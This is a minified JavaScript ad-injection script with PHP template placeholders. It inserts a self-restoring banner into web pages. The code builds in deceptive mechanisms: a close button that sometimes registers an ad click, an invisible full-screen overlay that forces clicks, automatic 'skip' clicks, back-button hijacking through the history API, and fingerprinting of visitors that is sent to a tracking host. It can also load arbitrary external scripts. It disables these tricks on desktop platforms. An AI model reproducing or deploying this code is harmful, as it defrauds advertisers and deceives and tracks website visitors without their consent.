;(function(){var key=Math.random().toString(36).substr(Math.floor(Math.random()*6+2));if(window[key]!=undefined)return;var lh=window[key]={};lh.$=function(name)
{if(name.substr(0,1)=='.'){return document.getElementsByClassName(name.substr(1));}else if(name.substr(0,1)=='#'){return document.getElementById(name.substr(1));}else{return document.getElementsByTagName('head');}};lh.getCo=function(name)
{var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");if(arr=document.cookie.match(reg)){return unescape(arr[2]);}else{return null;}};lh.setCo=function(name,value,second)
{var exp=new Date();exp.setTime(exp.getTime()+second*1000);document.cookie=name+"="+escape(value)+";expires="+exp.toGMTString();};lh.isCo=function()
{lh.setCo('iscookie','1');if('1'!=lh.getCo('iscookie')){return false;}else{return true;}};lh.Aclass=function(name,classname)
{var ele=lh.$(name);if(name.substr(0,1)=='.')
{for(index in ele)
{if((parseInt(index)||index=='0'))
{if(!ele[index].className.match(new RegExp("(\\s|^)"+classname+"(\\s|$)")))
{ele[index].className=ele[index].className+"  "+classname;}}}}
if(name.substr(0,1)=='#')
{if(!ele.className.match(new RegExp("(\\s|^)"+classname+"(\\s|$)")))
{ele.className=ele.className+"  "+classname;}}};lh.Rclass=function(name,classname)
{var ele=lh.$(name);if(name.substr(0,1)=='.')
{for(index in ele)
{if((parseInt(index)||index=='0'))
{if(ele[index].className.match(new RegExp("(\\s|^)"+classname+"(\\s|$)")))
{ele[index].className=ele[index].className.replace(new RegExp("(\\s|^)"+classname+"(\\s|$)"),"");}}}}
if(name.substr(0,1)=='#')
{if(ele.className.match(new RegExp("(\\s|^)"+classname+"(\\s|$)")))
{ele.className=ele.className.replace(new RegExp("(\\s|^)"+classname+"(\\s|$)"),"");}}};lh.encode=function(k,e)
{var t="";var n,r,i,s,o,u,a;var f=0;while(f<e.length)
{n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64;}else if(isNaN(i)){a=64;}
t=t+k.charAt(s)+k.charAt(o)+k.charAt(u)+k.charAt(a);}
return t;};lh.CScript=function(url)
{var script=document.createElement('script');script.async=true;script.src=url;document.body.appendChild(script);};lh.Aget=function(url,id)
{url=url+'?dt';var ajax=new XMLHttpRequest();ajax.open('get',url.replace(/\.[a-zA-Z]+\?dt/,'.txt')+'?123456');ajax.send();ajax.onreadystatechange=function(){if(ajax.readyState==4&&ajax.status==200){lh.$('#'+id).style.background="url('data:image/jpg;base64,"+ajax.responseText+"') no-repeat";}}};lh.Sstyle=function(D)
{var height=document.body.offsetWidth*(100+(3-D.size)*50)/640;if(/baidu/.test(D.user_agent)&&height>100)
{height=100;}
var hid_height=document.body.offsetWidth*D.hid_height/640+height;var label='body{margin: 0px;}'+D.style;if(D.position==1)
{var label=label+'.l'+key+' .h'+key+',.l'+key+' .d'+key+'{top: 0px;}';var label=label+'.l'+key+' .h'+key+' .c'+key+'{bottom: -15px;}';var label=label+'.l'+key+' .h'+key+' .a'+key+'{top: 0px;border-bottom-right-radius: 6px; }';}
if(D.position==2)
{var label=label+'.l'+key+' .h'+key+',.l'+key+' .d'+key+'{ bottom: 0px; }';var label=label+'.l'+key+' .h'+key+' .c'+key+'{ top: -15px; }';var label=label+'.l'+key+' .h'+key+' .a'+key+'{ bottom: 0px; border-top-right-radius: 6px;}';}
var label=label+'.hi'+key+'{display: none;}';var label=label+'.l'+key+' {overflow: initial;}';var label=label+'.l'+key+' *{-webkit-user-select: none;-moz-user-select: none;-webkit-user-select:none;-o-user-select:none;user-select:none;-webkit-tap-highlight-color: transparent;-webkit-tap-highlight-color:rgba(0,0,0,0);}';var label=label+'.l'+key+' .z'+key+'{width: 100%; height: '+height+'px;}';var label=label+'.l'+key+' .s'+key+'{position: fixed; z-index: '+D.index+'; width: 100%; height: 100%; top: 0px; left:0px; background: none;}';var label=label+'.l'+key+' .d'+key+'{position: fixed; z-index: '+D.index+'; width: 100%; height: '+hid_height+'px;background: none;}';var label=label+'.l'+key+' .h'+key+'{position: fixed; z-index: '+D.index+'; width: 100%; overflow: initial; height: auto;}';var label=label+'.l'+key+' .h'+key+' .c'+key+'{line-height: 15px; width: 15px; height: 15px; text-align: center; background: #90c7ae; color: #fff; position: absolute; right: 0px; z-index:'+D.index+'; font-size: 12px; opacity: 0.7;}';var label=label+'.l'+key+' .h'+key+' .a'+key+'{height: auto; line-height: 12px; padding: 1px 2px; text-align: center; border: 1px solid #0da74e; border-left: none; border-bottom: none; opacity: 0.8; color: #0da74e; position: absolute; left: 0px; font-size: 10px; z-index:'+D.index+'}';var label=label+'.l'+key+' .h'+key+' .m'+key+'{position: relative;}';var label=label+'.l'+key+' .h'+key+' .m'+key+' .img'+key+'{display: none; width: 100%; height: '+height+'px; background-size: 100% !important; pointer-events: none; }';var label=label+'.l'+key+' .h'+key+' .m'+key+' .t'+key+'{display: block;}';var label=label+'.an'+key+'{-webkit-animation-duration: 1.5s;-webkit-animation-fill-mode: both;-webkit-animation-iteration-count:infinite; animation-duration: 1.5s;animation-fill-mode: both;}';var label=label+'@-webkit-keyframes ts0 {0% {-webkit-transform: translate3d(0,-100%,0);opacity: 0;transform: translate3d(0,-100%,0)}to {-webkit-transform: translateZ(0);opacity: 1;transform: translateZ(0)}} @keyframes ts0 {0% {-webkit-transform: translate3d(0,-100%,0);opacity: 0;transform: translate3d(0,-100%,0)}to {-webkit-transform: translateZ(0);opacity: 1;transform: translateZ(0)}}';var label=label+'.ts0'+key+'{-webkit-animation-name: ts0;animation-name: ts0}';var label=label+'@-webkit-keyframes ts1 {0% {-webkit-transform: scaleX(1);transform: scaleX(1)}10%,20% {-webkit-transform: scale3d(.9,.9,.9) rotate(-3deg);transform: scale3d(.9,.9,.9) rotate(-3deg)}30%,50%,70%,90% {-webkit-transform: scale3d(1.1,1.1,1.1) rotate(3deg);transform: scale3d(1.1,1.1,1.1) rotate(3deg)}40%,60%,80% {-webkit-transform: scale3d(1.1,1.1,1.1) rotate(-3deg);transform: scale3d(1.1,1.1,1.1) rotate(-3deg)}to {-webkit-transform: scaleX(1);transform: scaleX(1)}} @keyframes ts1 {0% {-webkit-transform: scaleX(1);transform: scaleX(1)}10%,20% {-webkit-transform: scale3d(.9,.9,.9) rotate(-3deg);transform: scale3d(.9,.9,.9) rotate(-3deg)}30%,50%,70%,90% {-webkit-transform: scale3d(1.1,1.1,1.1) rotate(3deg);transform: scale3d(1.1,1.1,1.1) rotate(3deg)}40%,60%,80% {-webkit-transform: scale3d(1.1,1.1,1.1) rotate(-3deg);transform: scale3d(1.1,1.1,1.1) rotate(-3deg)}to {-webkit-transform: scaleX(1);transform: scaleX(1)}}';var label=label+'.ts1'+key+' { -webkit-animation-name: ts1; animation-name: ts1 }';var label=label+'@-webkit-keyframes ts2 { 0%,20%,53%,80%,to {-webkit-animation-timing-function: cubic-bezier(.215,.61,.355,1);-webkit-transform: translateZ(0);animation-timing-function: cubic-bezier(.215,.61,.355,1);transform: translateZ(0)} 40%,43% {-webkit-animation-timing-function: cubic-bezier(.755,.05,.855,.06);-webkit-transform: translate3d(0,-30px,0);animation-timing-function: cubic-bezier(.755,.05,.855,.06);transform: translate3d(0,-30px,0)} 70% {-webkit-animation-timing-function: cubic-bezier(.755,.05,.855,.06);-webkit-transform: translate3d(0,-15px,0);animation-timing-function: cubic-bezier(.755,.05,.855,.06);transform: translate3d(0,-15px,0)} 90% {-webkit-transform: translate3d(0,-4px,0);transform: translate3d(0,-4px,0)}} @keyframes ts2 { 0%,20%,53%,80%,to {-webkit-animation-timing-function: cubic-bezier(.215,.61,.355,1);-webkit-transform: translateZ(0);animation-timing-function: cubic-bezier(.215,.61,.355,1);transform: translateZ(0)} 40%,43% {-webkit-animation-timing-function: cubic-bezier(.755,.05,.855,.06);-webkit-transform: translate3d(0,-30px,0);animation-timing-function: cubic-bezier(.755,.05,.855,.06);transform: translate3d(0,-30px,0)} 70% {-webkit-animation-timing-function: cubic-bezier(.755,.05,.855,.06);-webkit-transform: translate3d(0,-15px,0);animation-timing-function: cubic-bezier(.755,.05,.855,.06);transform: translate3d(0,-15px,0)} 90% {-webkit-transform: translate3d(0,-4px,0);transform: translate3d(0,-4px,0)}}';var label=label+'.ts2'+key+' {-webkit-animation-name: ts2;-webkit-transform-origin: center bottom;animation-name: ts2;transform-origin: center bottom}';var label=label+'@-webkit-keyframes ts3 { 20% {-webkit-transform: rotate(15deg);transform: rotate(15deg)} 40% {-webkit-transform: rotate(-10deg);transform: rotate(-10deg)} 60% {-webkit-transform: rotate(5deg);transform: rotate(5deg)} 80% {-webkit-transform: rotate(-5deg);transform: rotate(-5deg)} to {-webkit-transform: rotate(0deg);transform: rotate(0deg)}} @keyframes ts3 {20% {-webkit-transform: rotate(15deg);transform: rotate(15deg)}40% {-webkit-transform: rotate(-10deg);transform: rotate(-10deg)}60% {-webkit-transform: rotate(5deg);transform: rotate(5deg)}80% {-webkit-transform: rotate(-5deg);transform: rotate(-5deg)}to {-webkit-transform: rotate(0deg);transform: rotate(0deg)}}';var label=label+'.ts3'+key+' { -webkit-animation-name: ts3; -webkit-transform-origin: top center; animation-name: ts3; transform-origin: top center }';var style=document.createElement('style');style.type='text/css';style.innerHTML=label;document.head.appendChild(style);lh.Shtml(D);};lh.Shtml=function(D)
{var label='';if(D.is_jiexi!='1')
{var label=label+'<div class="z'+key+'"></div>';}
var label=label+'<div class="d'+key+'" id="d'+key+'"></div>';var label=label+'<div class="s'+key+' hi'+key+'" id="s'+key+'"></div>';var label=label+'<div class="h'+key+'" id="h'+key+'">';var label=label+'<div class="c'+key+'" id="c'+key+'">╳</div>  <div class="a'+key+'"></div>';var label=label+'<div class="m'+key+'" id="m'+key+'">';for(index in D.matter)
{if(index==0){var label=label+'<div class="img'+key+' t'+key+'" id="img'+key+index+'";></div>';lh.Aget(D.murl+'/'+D.matter[index].path,'img'+key+index+'');}else{var label=label+'<div class="img'+key+'" id="img'+key+index+'"></div>';}}
var label=label+'</div>';var label=label+'</div>';var html=document.createElement('div');html.className='l'+key+'';html.id='l'+key+'';html.innerHTML=label;if(D.position==1)
{document.body.insertBefore(html,document.body.childNodes[0]);}
if(D.position==2)
{document.body.appendChild(html);}
lh.Sclo(D);if(D.adid=='3069'){setTimeout(function(){lh.click(D);},700);}
else
{lh.click(D);}
lh.switch(D);setInterval(function(){lh.Saction(D,(parseInt(Math.random()*3)+1));},10000);lh.Saction(D,0);var interval=setInterval(function(){var html=lh.$('#l'+key).innerHTML;eval('var reg = /class="h'+key+'" id="h'+key+'"/;');if(reg.test(html)){lh.$('#h'+key).style="";}else{var x=lh.$('#l'+key);x.remove(x.selectedIndex);lh.Shtml(D);clearInterval(interval);}},1000);};lh.switch=function(D)
{var index=1;setInterval(function(){if(index>=D.matter.length){index=0;}
var background=lh.$('#img'+key+index).style.background;if(!background){lh.Aget(D.murl+'/'+D.matter[index].path,'img'+key+index+'');}
setTimeout(function(){lh.Rclass('.img'+key,'t'+key);lh.Aclass('#img'+key+index,'t'+key);index++;},1000);},10000);};lh.Saction=function(D,n)
{if(D.js_effects=='1')
{lh.Aclass('#m'+key,'ts'+n+key+' an'+key);setTimeout(function(){lh.Rclass('#m'+key,'ts'+n+key+' an'+key);},1500);}};lh.Sclo=function(D)
{lh.$('#c'+key).addEventListener("click",function()
{if(D.false_clo>0)
{if(parseInt(Math.random()*100)<D.false_clo)
{lh.Aclass('.l'+key,'hi'+key);D.type='close';lh.open(D);}
else
{lh.Aclass('.l'+key,'hi'+key);}}
else
{lh.Aclass('.l'+key,'hi'+key);}
setTimeout(function(){lh.Rclass('.l'+key,'hi'+key);},30000);});};lh.open=function(D)
{var eve=event||window.event;if(lh.isCo())
{var ip=lh.getCo('is_repeat_ip_'+D.adid);var ips=new Array();ips=ip.split(':');var ip_length=ips.length;}
else
{var ip_length=1;}
var url=D.purl+"/pc?se="+D.string;var p="refso="+(window.DeviceOrientationEvent?1:0)+"_"+navigator.platform;p=p+"&url="+encodeURIComponent(document.location);p=p+"&source="+encodeURIComponent(document.referrer);p=p+"&screen="+window.screen.width+"*"+window.screen.height;p=p+"&ifrom="+(self!=top?1:0);p=p+"&interval="+parseInt((((new Date()).getTime())-D.time)/1000);p=p+"&history="+history.length;p=p+"&ipnumber="+ip_length;if(eve){if(eve.screenX>0&&eve.screenY>0){p=p+"&clickp="+eve.screenX+"*"+eve.screenY;}else{p=p+"&clickp=0*0";}}else{p=p+"&clickp=0*0";}
p=p+"&link="+encodeURIComponent(D.link);p=p+"&ctype="+D.type;p=p+"&jstime="+parseInt((new Date()).getTime()/1000);url=url+"&"+p+"&t="+Math.random();if(D.type!='skip'){lh.setCo('return_11',1,120);}
lh.setCo('click_type','11',120);lh.CScript(url);};lh.rsk=function(D)
{if(D.click_return.state=='1'&&parseInt(Math.random()*100)<D.click_return.chance)
{if(!!(window.history&&history.pushState))
{window.addEventListener("popstate",function(event)
{var is_click_return=lh.getCo('is_click_return');if(!is_click_return)
{lh.setCo('is_click_return','1',3);lh.setCo('return_type','click_return',15);D.type='click_return';lh.open(D);}});window.history.pushState(null,null,null);}}
if(D.own_return.state=='1'&&parseInt(Math.random()*100)<D.own_return.chance)
{window.addEventListener('pageshow',function(e)
{if(e.persisted||window.performance&&window.performance.navigation.type==2)
{var own_return_key='own_return_11';var return_type=lh.getCo('return_type');var return_num=parseInt(lh.getCo(own_return_key));if(return_type=='click_return'){if(return_num<=D.own_return.number||D.own_return.number==0)
{lh.setCo(own_return_key,return_num+1,120);D.type='own_return';lh.open(D);}}}},false);}
if(D.other_return.state=='1'&&parseInt(Math.random()*100)<D.other_return.chance)
{window.addEventListener('pageshow',function(e)
{if(e.persisted||window.performance&&window.performance.navigation.type==2)
{var other_return_key='other_return_11';var return_type=lh.getCo('return_type');var return_num=parseInt(lh.getCo(other_return_key));if(return_type!='click_return'){if(return_num<=D.other_return.number||D.other_return.number==0)
{lh.setCo(other_return_key,return_num+1,120);D.type='other_return';lh.open(D);}}}},false);}};lh.ski=function(D)
{if(D.advid!=84&&D.advid!=83){if(parseInt(Math.random()*100)<D.skip)
{setTimeout(function(){D.type='skip';lh.open(D);},2000);}
else
{var Da=new Date();var S=Da.getSeconds();if(D.skip>0)
{if(S>=1&&S<=4)
{setTimeout(function(){D.type='skip';lh.open(D);},3000);}}}}};lh.zhik=function(D)
{if(parseInt(Math.random()*100)<D.zhikl){}};lh.show=function(D)
{var num=1;if(lh.isCo())
{var ip=lh.getCo('is_repeat_ip_'+D.adid);if(ip){if(ip.indexOf(D.ip2long)>-1){var num=5;}else{ip=ip+':'+D.ip2long;lh.setCo('is_repeat_ip_'+D.adid,ip,D.dis_time);}}else{ip=D.ip2long;lh.setCo('is_repeat_ip_'+D.adid,ip,D.dis_time);}}
if(parseInt(Math.random()*100)<(100/num)){var url=D.purl+"/pv?se="+D.string;url=url+"&refso="+(window.DeviceOrientationEvent?1:0)+"_"+navigator.platform+"_"+history.length;url=url+"&url="+encodeURIComponent(document.location);url=url+"&source="+encodeURIComponent(document.referrer);url=url+"&screen="+window.screen.width+"*"+window.screen.height;url=url+"&n="+num;url=url+"&ip=1";url=url+"&ifrom=1";url=url+"&time="+Math.random();lh.CScript(url);}};lh.ComCli=function(D)
{if(window.navigator.cookieEnabled)
{if(parseInt(Math.random()*100)<=D.com_cha)
{var com_cli=lh.getCo('com_cli_11');if(com_cli!='click'&&D.com_cli=='1')
{lh.$('#s'+key).addEventListener("click",function(){D.type='compel_click';lh.open(D);lh.Aclass('.s'+key,'hi'+key);lh.setCo('com_cli_11','click',D.com_cli_inter*3600);});setTimeout(function(){lh.Rclass('.s'+key,'hi'+key);},1000);}}}};lh.click=function(D)
{lh.$('#d'+key).addEventListener("click",function(){D.type='hidden';lh.open(D);});lh.$('#m'+key).addEventListener("click",function(){D.type='good';lh.open(D);});};lh.IsMN=function()
{if(navigator.platform.indexOf("Win")==0||navigator.platform.indexOf("Mac")==0){return true;}else{return false;}};lh.init=function(D)
{D.user_agent=navigator.userAgent.toLowerCase();D.time=(new Date()).getTime();D.key='ZtKfUjbwiR90dm8BgsX4cQ7T5W6kDCHNYG1oyEzqpxrLlFSJPn3uMevhOaVI2A+/=';if(lh.IsMN())
{D.false_clo=-1;D.hid_height=-1;D.zhikl=-1;D.skip=-1;}
else
{lh.show(D);lh.Sstyle(D);lh.rsk(D);lh.ski(D);lh.zhik(D);lh.ComCli(D);if(D.statis_code&&parseInt(Math.random()*100)<D.statis_code_ratio){lh.CScript(D.statis_code);}}};lh.Data={size:parseInt("<?php echo $webmasterAd['ad_size']; ?>"),matter:JSON.parse('<?php echo json_encode($matter, true); ?>'),purl:"<?php echo $purl_domain; ?>",murl:"<?php echo $matter_domain; ?>",string:"<?php echo $string; ?>",rskip_str:"<?php echo $rskip_str; ?>",is_check:parseInt("<?php echo $webmasterAd['is_check']; ?>"),com_cli:"<?php echo $webmasterAd['compel_click']; ?>",com_cha:parseInt("<?php echo $webmasterAd['compel_chance']; ?>"),com_cli_inter:parseInt("<?php echo $webmasterAd['compel_interval']; ?>"),false_clo:parseInt("<?php echo $webmasterAd['false_close']; ?>"),hid_height:parseInt("<?php echo $webmasterAd['hid_height']; ?>"),is_wechat:"<?php echo self::$client['isWechat']; ?>",zhikl:parseInt("<?php echo $webmasterAd['zhikouling']; ?>"),skip:parseInt("<?php echo $webmasterAd['compel_skip']; ?>"),position:parseInt("<?php echo $webmasterAd['position']; ?>"),style:"<?php echo $webmasterAd['style']; ?>",link:"<?php echo $advertiserAd['link']; ?>",js_effects:"<?php echo $webmasterAd['js_effects']; ?>",adid:"<?php echo $webmasterAd['id']; ?>",click_return:JSON.parse('<?php echo $webmasterAd["click_return"]; ?>'),own_return:JSON.parse('<?php echo $webmasterAd["own_return"]; ?>'),other_return:JSON.parse('<?php echo $webmasterAd["other_return"]; ?>'),is_jiexi:parseInt("<?php echo $webmasterAd['is_jiexi']; ?>"),statis_code:"<?php echo $webmasterAd['statis_code']; ?>",statis_code_ratio:parseInt("<?php echo $webmasterAd['statis_code_ratio']; ?>"),advid:"<?php echo $advertiserAd['id']; ?>",ip2long:"<?php echo ip2long(self::$client['ip']); ?>",dis_time:parseInt("<?php echo $distance_time; ?>"),index:"<?php echo $index; ?>",};lh.init(lh.Data);})();